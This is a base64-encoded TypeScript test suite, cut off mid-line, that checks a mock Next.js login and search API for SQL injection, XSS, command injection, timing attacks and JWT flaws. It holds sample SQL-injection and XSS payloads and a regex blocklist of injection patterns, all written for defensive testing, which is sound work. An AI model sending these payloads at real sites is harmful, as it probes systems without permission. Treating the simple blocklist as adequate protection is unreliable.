cmVBdXRoSGFuZGxlciA9IGFzeW5jIChyZXE6IE5leHRSZXF1ZXN0KSA9PiB7XG4gIGNvbnN0IGJvZHkgPSBhd2FpdCByZXEuanNvbigpO1xuICBjb25zdCB7IGVtYWlsLCBwYXNzd29yZCB9ID0gYm9keTtcblxuICAvLyBSYXRlIGxpbWl0aW5nIHNpbXVsYXRpb25cbiAgY29uc3QgY2xpZW50SVAgPSByZXEuaGVhZGVycy5nZXQoJ3gtZm9yd2FyZGVkLWZvcicpIHx8ICd1bmtub3duJztcbiAgXG4gIC8vIElucHV0IHZhbGlkYXRpb25cbiAgaWYgKCFlbWFpbCB8fCAhcGFzc3dvcmQpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICB7IGVycm9yOiAnRW1haWwgYW5kIHBhc3N3b3JkIGFyZSByZXF1aXJlZCcgfSxcbiAgICAgIHsgc3RhdHVzOiA0MDAgfVxuICAgICk7XG4gIH1cblxuICBpZiAoZW1haWwubGVuZ3RoID4gMjU0IHx8IHBhc3N3b3JkLmxlbmd0aCA+IDEyOCkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgIHsgZXJyb3I6ICdJbnB1dCB0b28gbG9uZycgfSxcbiAgICAgIHsgc3RhdHVzOiA0MDAgfVxuICAgICk7XG4gIH1cblxuICAvLyBFbWFpbCBmb3JtYXQgdmFsaWRhdGlvblxuICBjb25zdCBlbWFpbFJlZ2V4ID0gL15bXlxcc0BdK0BbXlxcc0BdK1xcLlteXFxzQF0rJC87XG4gIGlmICghZW1haWxSZWdleC50ZXN0KGVtYWlsKSkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgIHsgZXJyb3I6ICdJbnZhbGlkIGVtYWlsIGZvcm1hdCcgfSxcbiAgICAgIHsgc3RhdHVzOiA0MDAgfVxuICAgICk7XG4gIH1cblxuICAvLyBDaGVjayBmb3Igc3VzcGljaW91cyBwYXR0ZXJuc1xuICBjb25zdCBzdXNwaWNpb3VzUGF0dGVybnMgPSBbXG4gICAgLzxzY3JpcHQvaSxcbiAgICAvamF2YXNjcmlwdDovaSxcbiAgICAvb25cXHcrPS9pLFxuICAgIC9cXGJvclxcYi4qXFxiMVxccyo9XFxzKjFcXGIvaSxcbiAgICAvdW5pb24uKnNlbGVjdC9pLFxuICAgIC9kcm9wLip0YWJsZS9pLFxuICBdO1xuXG4gIGNvbnN0IGlzU3VzcGljaW91cyA9IHN1c3BpY2lvdXNQYXR0ZXJucy5zb21lKHBhdHRlcm4gPT4gXG4gICAgcGF0dGVybi50ZXN0KGVtYWlsKSB8fCBwYXR0ZXJuLnRlc3QocGFzc3dvcmQpXG4gICk7XG5cbiAgaWYgKGlzU3VzcGljaW91cykge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgIHsgZXJyb3I6ICdJbnZhbGlkIGlucHV0IGRldGVjdGVkJyB9LFxuICAgICAgeyBzdGF0dXM6IDQwMCB9XG4gICAgKTtcbiAgfVxuXG4gIHRyeSB7XG4gICAgY29uc3QgdXNlciA9IGF3YWl0IG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlKHtcbiAgICAgIHdoZXJlOiB7IGVtYWlsIH0sXG4gICAgfSk7XG5cbiAgICBpZiAoIXVzZXIpIHtcbiAgICAgIC8vIENvbnN0YW50IHRpbWUgZGVsYXkgdG8gcHJldmVudCB0aW1pbmcgYXR0YWNrc1xuICAgICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDEwMCkpO1xuICAgICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKFxuICAgICAgICB7IGVycm9yOiAnSW52YWxpZCBjcmVkZW50aWFscycgfSxcbiAgICAgICAgeyBzdGF0dXM6IDQwMSB9XG4gICAgICApO1xuICAgIH1cblxuICAgIGNvbnN0IGlzVmFsaWQgPSBhd2FpdCBiY3J5cHQuY29tcGFyZShwYXNzd29yZCwgdXNlci5wYXNzd29yZCk7XG4gICAgaWYgKCFpc1ZhbGlkKSB7XG4gICAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oXG4gICAgICAgIHsgZXJyb3I6ICdJbnZhbGlkIGNyZWRlbnRpYWxzJyB9LFxuICAgICAgICB7IHN0YXR1czogNDAxIH1cbiAgICAgICk7XG4gICAgfVxuXG4gICAgLy8gR2VuZXJhdGUgc2VjdXJlIHRva2VuXG4gICAgY29uc3QgdG9rZW4gPSBqd3Quc2lnbihcbiAgICAgIHsgXG4gICAgICAgIHVzZXJJZDogdXNlci5pZCwgXG4gICAgICAgIGVtYWlsOiB1c2VyLmVtYWlsLFxuICAgICAgICBpYXQ6IE1hdGguZmxvb3IoRGF0ZS5ub3coKSAvIDEwMDApLFxuICAgICAgfSxcbiAgICAgIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQgfHwgJ3Rlc3Qtc2VjcmV0JyxcbiAgICAgIHsgXG4gICAgICAgIGV4cGlyZXNJbjogJzE1bScsXG4gICAgICAgIGlzc3VlcjogJ21kLXNwb3J0cycsXG4gICAgICAgIGF1ZGllbmNlOiAnbWQtc3BvcnRzLWNsaWVudCcsXG4gICAgICB9XG4gICAgKTtcblxuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7XG4gICAgICB1c2VyOiB7XG4gICAgICAgIGlkOiB1c2VyLmlkLFxuICAgICAgICBlbWFpbDogdXNlci5lbWFpbCxcbiAgICAgICAgbmFtZTogdXNlci5uYW1lLFxuICAgICAgfSxcbiAgICAgIHRva2VuLFxuICAgIH0pO1xuICB9IGNhdGNoIChlcnJvcikge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbihcbiAgICAgIHsgZXJyb3I6ICdJbnRlcm5hbCBzZXJ2ZXIgZXJyb3InIH0sXG4gICAgICB7IHN0YXR1czogNTAwIH1cbiAgICApO1xuICB9XG59O1xuXG5kZXNjcmliZSgnU2VjdXJpdHkgVGVzdHMnLCAoKSA9PiB7XG4gIGJlZm9yZUFsbCgoKSA9PiB7XG4gICAgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCA9ICd0ZXN0LXNlY3JldC1rZXktZm9yLXNlY3VyaXR5LXRlc3RpbmcnO1xuICB9KTtcblxuICBiZWZvcmVFYWNoKCgpID0+IHtcbiAgICBqZXN0LmNsZWFyQWxsTW9ja3MoKTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ1NRTCBJbmplY3Rpb24gUHJvdGVjdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHByZXZlbnQgU1FMIGluamVjdGlvbiBpbiBzZWFyY2ggcXVlcmllcycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHNxbFBheWxvYWRzID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVTUUxJbmplY3Rpb25QYXlsb2FkcygpO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IHBheWxvYWQgb2Ygc3FsUGF5bG9hZHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdChcbiAgICAgICAgICBgaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9zZWFyY2g/cT0ke2VuY29kZVVSSUNvbXBvbmVudChwYXlsb2FkKX1gXG4gICAgICAgICk7XG5cbiAgICAgICAgLy8gVGVzdCB3aXRoIHNlY3VyZSBoYW5kbGVyXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlU2VhcmNoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIC8vIFNob3VsZCBub3QgcmV0dXJuIDUwMCBlcnJvciBvciBleHBvc2UgZGF0YWJhc2Ugc3RydWN0dXJlXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLm5vdC50b0JlKDUwMCk7XG4gICAgICAgIFxuICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpO1xuICAgICAgICBleHBlY3QoZGF0YSkubm90LnRvSGF2ZVByb3BlcnR5KCdyZXN1bHRzJyk7XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHVzZSBwYXJhbWV0ZXJpemVkIHF1ZXJpZXMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBtb2NrUHJpc21hLnByb2R1Y3QuZmluZE1hbnkubW9ja1Jlc29sdmVkVmFsdWUoW10pO1xuICAgICAgXG4gICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KFxuICAgICAgICBcImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvc2VhcmNoP3E9dGVzdCcgT1IgJzEnPScxXCJcbiAgICAgICk7XG5cbiAgICAgIGF3YWl0IHNlY3VyZVNlYXJjaEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICBcbiAgICAgIC8vIFZlcmlmeSBwYXJhbWV0ZXJpemVkIHF1ZXJ5IHdhcyB1c2VkXG4gICAgICBleHBlY3QobW9ja1ByaXNtYS5wcm9kdWN0LmZpbmRNYW55KS50b0hhdmVCZWVuQ2FsbGVkV2l0aCh7XG4gICAgICAgIHdoZXJlOiB7XG4gICAgICAgICAgbmFtZToge1xuICAgICAgICAgICAgY29udGFpbnM6IFwidGVzdCBPUiAxMVwiLCAvLyBTYW5pdGl6ZWRcbiAgICAgICAgICAgIG1vZGU6ICdpbnNlbnNpdGl2ZScsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnWFNTIFByb3RlY3Rpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBzYW5pdGl6ZSBYU1MgcGF5bG9hZHMgaW4gaW5wdXQnLCBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCB4c3NQYXlsb2FkcyA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlWFNTUGF5bG9hZHMoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCBwYXlsb2FkIG9mIHhzc1BheWxvYWRzKSB7XG4gICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoXG4gICAgICAgICAgYGh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvc2VhcmNoP3E9JHtlbmNvZGVVUklDb21wb25lbnQocGF5bG9hZCl9YFxuICAgICAgICApO1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlU2VhcmNoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgICAgXG4gICAgICAgIC8vIFNob3VsZCBub3QgY29udGFpbiBzY3JpcHQgdGFncyBvciBqYXZhc2NyaXB0XG4gICAgICAgIGlmIChkYXRhLnJlc3VsdHMpIHtcbiAgICAgICAgICBjb25zdCByZXNwb25zZVN0ciA9IEpTT04uc3RyaW5naWZ5KGRhdGEpO1xuICAgICAgICAgIGV4cGVjdChyZXNwb25zZVN0cikubm90LnRvTWF0Y2goLzxzY3JpcHQvaSk7XG4gICAgICAgICAgZXhwZWN0KHJlc3BvbnNlU3RyKS5ub3QudG9NYXRjaCgvamF2YXNjcmlwdDovaSk7XG4gICAgICAgICAgZXhwZWN0KHJlc3BvbnNlU3RyKS5ub3QudG9NYXRjaCgvb25cXHcrPS9pKTtcbiAgICAgICAgfVxuICAgICAgfVxuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCByZWplY3Qgc3VzcGljaW91cyBpbnB1dCBwYXR0ZXJucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IHtcbiAgICAgICAgICBlbWFpbDogJzxzY3JpcHQ+YWxlcnQoXCJ4c3NcIik8L3NjcmlwdD5AdGVzdC5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9LFxuICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcbiAgICAgICAgfSxcbiAgICAgIH0pO1xuXG4gICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IHNlY3VyZUF1dGhIYW5kbGVyKHJlcXVlc3QpO1xuICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTtcbiAgICAgIFxuICAgICAgZXhwZWN0KHJlc3BvbnNlLnN0YXR1cykudG9CZSg0MDApO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLnRvQmUoJ0ludmFsaWQgaW5wdXQgZGV0ZWN0ZWQnKTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0F1dGhlbnRpY2F0aW9uIFNlY3VyaXR5JywgKCkgPT4ge1xuICAgIGl0KCdzaG91bGQgcmVqZWN0IGludmFsaWQgSldUIHRva2VucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGludmFsaWRUb2tlbnMgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUludmFsaWRUb2tlbnMoKTtcbiAgICAgIFxuICAgICAgZm9yIChjb25zdCB0b2tlbiBvZiBpbnZhbGlkVG9rZW5zKSB7XG4gICAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgICAgand0LnZlcmlmeSh0b2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpO1xuICAgICAgICB9KS50b1Rocm93KCk7XG4gICAgICB9XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIHJlamVjdCBleHBpcmVkIHRva2VucycsIGFzeW5jICgpID0+IHtcbiAgICAgIGNvbnN0IGV4cGlyZWRUb2tlbiA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlRXhwaXJlZEpXVCh7XG4gICAgICAgIHVzZXJJZDogMSxcbiAgICAgICAgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyxcbiAgICAgIH0pO1xuICAgICAgXG4gICAgICBleHBlY3QoKCkgPT4ge1xuICAgICAgICBqd3QudmVyaWZ5KGV4cGlyZWRUb2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpO1xuICAgICAgfSkudG9UaHJvdygnand0IGV4cGlyZWQnKTtcbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdXNlIHNlY3VyZSBwYXNzd29yZCBoYXNoaW5nJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcGFzc3dvcmQgPSAndGVzdHBhc3N3b3JkMTIzJztcbiAgICAgIGNvbnN0IGhhc2ggPSBhd2FpdCBTZWN1cml0eVRlc3RVdGlscy5oYXNoUGFzc3dvcmQocGFzc3dvcmQpO1xuICAgICAgXG4gICAgICAvLyBTaG91bGQgYmUgYmNyeXB0IGhhc2hcbiAgICAgIGV4cGVjdChoYXNoKS50b01hdGNoKC9eXFwkMlthYnldXFwkXFxkK1xcJC8pO1xuICAgICAgXG4gICAgICAvLyBTaG91bGQgbm90IGJlIHRoZSBvcmlnaW5hbCBwYXNzd29yZFxuICAgICAgZXhwZWN0KGhhc2gpLm5vdC50b0JlKHBhc3N3b3JkKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIHZlcmlmeSBjb3JyZWN0bHlcbiAgICAgIGNvbnN0IGlzVmFsaWQgPSBhd2FpdCBiY3J5cHQuY29tcGFyZShwYXNzd29yZCwgaGFzaCk7XG4gICAgICBleHBlY3QoaXNWYWxpZCkudG9CZSh0cnVlKTtcbiAgICAgIFxuICAgICAgLy8gU2hvdWxkIG5vdCB2ZXJpZnkgd2l0aCB3cm9uZyBwYXNzd29yZFxuICAgICAgY29uc3QgaXNJbnZhbGlkID0gYXdhaXQgYmNyeXB0LmNvbXBhcmUoJ3dyb25ncGFzc3dvcmQnLCBoYXNoKTtcbiAgICAgIGV4cGVjdChpc0ludmFsaWQpLnRvQmUoZmFsc2UpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBwcmV2ZW50IHRpbWluZyBhdHRhY2tzIGluIGF1dGhlbnRpY2F0aW9uJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgdmFsaWRFbWFpbCA9ICd0ZXN0QGV4YW1wbGUuY29tJztcbiAgICAgIGNvbnN0IGludmFsaWRFbWFpbCA9ICdub25leGlzdGVudEBleGFtcGxlLmNvbSc7XG4gICAgICBcbiAgICAgIC8vIE1vY2sgdXNlciBsb29rdXBcbiAgICAgIG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlLm1vY2tJbXBsZW1lbnRhdGlvbigoeyB3aGVyZSB9KSA9PiB7XG4gICAgICAgIGlmICh3aGVyZS5lbWFpbCA9PT0gdmFsaWRFbWFpbCkge1xuICAgICAgICAgIHJldHVybiBQcm9taXNlLnJlc29sdmUoe1xuICAgICAgICAgICAgaWQ6IDEsXG4gICAgICAgICAgICBlbWFpbDogdmFsaWRFbWFpbCxcbiAgICAgICAgICAgIHBhc3N3b3JkOiAnJDJhJDEwJGhhc2hlZFBhc3N3b3JkJyxcbiAgICAgICAgICAgIG5hbWU6ICdUZXN0IFVzZXInLFxuICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQcm9taXNlLnJlc29sdmUobnVsbCk7XG4gICAgICB9KTtcblxuICAgICAgY29uc3QgdmFsaWRSZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICBib2R5OiB7XG4gICAgICAgICAgZW1haWw6IHZhbGlkRW1haWwsXG4gICAgICAgICAgcGFzc3dvcmQ6ICd3cm9uZ3Bhc3N3b3JkJyxcbiAgICAgICAgfSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgY29uc3QgaW52YWxpZFJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IHtcbiAgICAgICAgICBlbWFpbDogaW52YWxpZEVtYWlsLFxuICAgICAgICAgIHBhc3N3b3JkOiAnd3JvbmdwYXNzd29yZCcsXG4gICAgICAgIH0sXG4gICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICB9LFxuICAgICAgfSk7XG5cbiAgICAgIC8vIE1lYXN1cmUgcmVzcG9uc2UgdGltZXNcbiAgICAgIGNvbnN0IHN0YXJ0MSA9IERhdGUubm93KCk7XG4gICAgICBjb25zdCByZXNwb25zZTEgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcih2YWxpZFJlcXVlc3QpO1xuICAgICAgY29uc3QgdGltZTEgPSBEYXRlLm5vdygpIC0gc3RhcnQxO1xuXG4gICAgICBjb25zdCBzdGFydDIgPSBEYXRlLm5vdygpO1xuICAgICAgY29uc3QgcmVzcG9uc2UyID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIoaW52YWxpZFJlcXVlc3QpO1xuICAgICAgY29uc3QgdGltZTIgPSBEYXRlLm5vdygpIC0gc3RhcnQyO1xuXG4gICAgICAvLyBCb3RoIHNob3VsZCByZXR1cm4gNDAxXG4gICAgICBleHBlY3QocmVzcG9uc2UxLnN0YXR1cykudG9CZSg0MDEpO1xuICAgICAgZXhwZWN0KHJlc3BvbnNlMi5zdGF0dXMpLnRvQmUoNDAxKTtcbiAgICAgIFxuICAgICAgLy8gUmVzcG9uc2UgdGltZXMgc2hvdWxkIGJlIHNpbWlsYXIgKHdpdGhpbiA1MG1zKVxuICAgICAgZXhwZWN0KE1hdGguYWJzKHRpbWUxIC0gdGltZTIpKS50b0JlTGVzc1RoYW4oNTApO1xuICAgIH0pO1xuICB9KTtcblxuICBkZXNjcmliZSgnSW5wdXQgVmFsaWRhdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHJlamVjdCBvdmVyc2l6ZWQgaW5wdXRzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgbG9uZ1N0cmluZ3MgPSBTZWN1cml0eVRlc3RVdGlscy5nZW5lcmF0ZUxvbmdTdHJpbmdzKCk7XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgbG9uZ1N0cmluZyBvZiBsb25nU3RyaW5ncykge1xuICAgICAgICBjb25zdCByZXF1ZXN0ID0gY3JlYXRlTW9ja05leHRSZXF1ZXN0KCdodHRwOi8vbG9jYWxob3N0OjMwMDAvYXBpL2F1dGgvbG9naW4nLCB7XG4gICAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgICAgYm9keToge1xuICAgICAgICAgICAgZW1haWw6IGxvbmdTdHJpbmcsXG4gICAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgICB9LFxuICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAwKTtcbiAgICAgIH1cbiAgICB9KTtcblxuICAgIGl0KCdzaG91bGQgdmFsaWRhdGUgZW1haWwgZm9ybWF0JywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgaW52YWxpZEVtYWlscyA9IFtcbiAgICAgICAgJ2ludmFsaWQtZW1haWwnLFxuICAgICAgICAnQGRvbWFpbi5jb20nLFxuICAgICAgICAndXNlckAnLFxuICAgICAgICAndXNlci4ubmFtZUBkb21haW4uY29tJyxcbiAgICAgICAgJ3VzZXJAZG9tYWluJyxcbiAgICAgICAgJycsXG4gICAgICAgICd1c2VyIG5hbWVAZG9tYWluLmNvbScsXG4gICAgICBdO1xuICAgICAgXG4gICAgICBmb3IgKGNvbnN0IGVtYWlsIG9mIGludmFsaWRFbWFpbHMpIHtcbiAgICAgICAgY29uc3QgcmVxdWVzdCA9IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgIGJvZHk6IHtcbiAgICAgICAgICAgIGVtYWlsLFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdwYXNzd29yZDEyMycsXG4gICAgICAgICAgfSxcbiAgICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICAgIH0sXG4gICAgICAgIH0pO1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgc2VjdXJlQXV0aEhhbmRsZXIocmVxdWVzdCk7XG4gICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICAgIFxuICAgICAgICBleHBlY3QocmVzcG9uc2Uuc3RhdHVzKS50b0JlKDQwMCk7XG4gICAgICAgIGV4cGVjdChkYXRhLmVycm9yKS50b0JlKCdJbnZhbGlkIGVtYWlsIGZvcm1hdCcpO1xuICAgICAgfVxuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCBoYW5kbGUgbnVsbCBieXRlcyBhbmQgc3BlY2lhbCBjaGFyYWN0ZXJzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgbWFsaWNpb3VzSW5wdXRzID0gW1xuICAgICAgICAndGVzdFxceDAwQGV4YW1wbGUuY29tJyxcbiAgICAgICAgJ3Rlc3RcXHJcXG5AZXhhbXBsZS5jb20nLFxuICAgICAgICAndGVzdFxcdEBleGFtcGxlLmNvbScsXG4gICAgICAgICd0ZXN0XFxiQGV4YW1wbGUuY29tJyxcbiAgICAgIF07XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgaW5wdXQgb2YgbWFsaWNpb3VzSW5wdXRzKSB7XG4gICAgICAgIGNvbnN0IHJlcXVlc3QgPSBjcmVhdGVNb2NrTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgICBib2R5OiB7XG4gICAgICAgICAgICBlbWFpbDogaW5wdXQsXG4gICAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgICB9LFxuICAgICAgICAgIGhlYWRlcnM6IHtcbiAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgICAgfSxcbiAgICAgICAgfSk7XG5cbiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgICAgXG4gICAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAwKTtcbiAgICAgIH1cbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0NvbW1hbmQgSW5qZWN0aW9uIFByb3RlY3Rpb24nLCAoKSA9PiB7XG4gICAgaXQoJ3Nob3VsZCBwcmV2ZW50IGNvbW1hbmQgaW5qZWN0aW9uIGluIGZpbGUgb3BlcmF0aW9ucycsICgpID0+IHtcbiAgICAgIGNvbnN0IGNvbW1hbmRQYXlsb2FkcyA9IFNlY3VyaXR5VGVzdFV0aWxzLmdlbmVyYXRlQ29tbWFuZEluamVjdGlvblBheWxvYWRzKCk7XG4gICAgICBcbiAgICAgIGZvciAoY29uc3QgcGF5bG9hZCBvZiBjb21tYW5kUGF5bG9hZHMpIHtcbiAgICAgICAgLy8gU2ltdWxhdGUgZmlsZSBuYW1lIHZhbGlkYXRpb25cbiAgICAgICAgY29uc3QgaXNWYWxpZEZpbGVOYW1lID0gKGZpbGVuYW1lOiBzdHJpbmcpOiBib29sZWFuID0+IHtcbiAgICAgICAgICAvLyBPbmx5IGFsbG93IGFscGhhbnVtZXJpYywgZG90cywgaHlwaGVucywgYW5kIHVuZGVyc2NvcmVzXG4gICAgICAgICAgcmV0dXJuIC9eW2EtekEtWjAtOS5fLV0rJC8udGVzdChmaWxlbmFtZSk7XG4gICAgICAgIH07XG4gICAgICAgIFxuICAgICAgICBleHBlY3QoaXNWYWxpZEZpbGVOYW1lKHBheWxvYWQpKS50b0JlKGZhbHNlKTtcbiAgICAgIH1cbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0pXVCBTZWN1cml0eScsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIHVzZSBzZWN1cmUgSldUIGNvbmZpZ3VyYXRpb24nLCAoKSA9PiB7XG4gICAgICBjb25zdCBwYXlsb2FkID0geyB1c2VySWQ6IDEsIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScgfTtcbiAgICAgIGNvbnN0IHRva2VuID0gU2VjdXJpdHlUZXN0VXRpbHMuZ2VuZXJhdGVWYWxpZEpXVChwYXlsb2FkKTtcbiAgICAgIFxuICAgICAgY29uc3QgZGVjb2RlZCA9IGp3dC52ZXJpZnkodG9rZW4sIHByb2Nlc3MuZW52LkpXVF9TRUNSRVQhKSBhcyBhbnk7XG4gICAgICBcbiAgICAgIGV4cGVjdChkZWNvZGVkLnVzZXJJZCkudG9CZSgxKTtcbiAgICAgIGV4cGVjdChkZWNvZGVkLmVtYWlsKS50b0JlKCd0ZXN0QGV4YW1wbGUuY29tJyk7XG4gICAgICBleHBlY3QoZGVjb2RlZC5pYXQpLnRvQmVEZWZpbmVkKCk7XG4gICAgICBleHBlY3QoZGVjb2RlZC5leHApLnRvQmVEZWZpbmVkKCk7XG4gICAgfSk7XG5cbiAgICBpdCgnc2hvdWxkIG5vdCBhY2NlcHQgdG9rZW5zIHdpdGggbm9uZSBhbGdvcml0aG0nLCAoKSA9PiB7XG4gICAgICAvLyBDcmVhdGUgYSB0b2tlbiB3aXRoICdub25lJyBhbGdvcml0aG0gKHNlY3VyaXR5IHZ1bG5lcmFiaWxpdHkpXG4gICAgICBjb25zdCBoZWFkZXIgPSBCdWZmZXIuZnJvbShKU09OLnN0cmluZ2lmeSh7IGFsZzogJ25vb